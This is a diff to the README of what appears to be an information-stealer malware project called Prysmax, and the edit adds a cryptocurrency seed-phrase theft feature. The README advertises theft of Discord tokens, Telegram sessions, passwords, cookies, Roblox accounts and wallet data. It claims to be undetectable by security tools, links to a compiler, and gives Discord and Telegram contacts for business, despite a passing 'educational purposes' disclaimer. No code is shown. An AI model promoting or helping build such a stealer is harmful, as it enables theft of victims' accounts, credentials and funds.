@@ -1,5 +1,5 @@
 # MAKE U OWN STEALER - SOURCE SCRIPTS !! 🚀
-## STARR FOR MORE UPDATES ❤️ 
+## 🌟 STARR FOR MORE UPDATES ❤️ 
 - 🌟 If you want to compile your file go to the Prysmax repository and compile it for free and easy! - [Prysmax Compilator](https://github.com/Lawxsz/prysmax)
 - Discord: https://discord.gg/g69Bv8fB
 - Telegram: https://t.me/prysmax - https://t.me/lawxsz dm for bussiness!!
@@ -25,7 +25,7 @@ This repository is for educational purposes only, we only provide Python Scripts
 - ⬛ FUD (FULLY UNDETECTABLE to Firewall)
 - 🚀 Telegram Stealer 
 - 🚀 Discord Tokens
-- 🦊 MetaMask/Exodus/Binance/Phantom/Coin98/Jaxx/Xinpay/StarMask/Mobox/More!!
+- 🦊 Seed Phraser | MetaMask/Exodus/Binance/Phantom/Coin98/Jaxx/Xinpay/StarMask/Mobox/More!!
 - 🚀 Roblox Steal
 - 🌩️ Passwords Stealer
 - 🌩️ Cookies Stealer
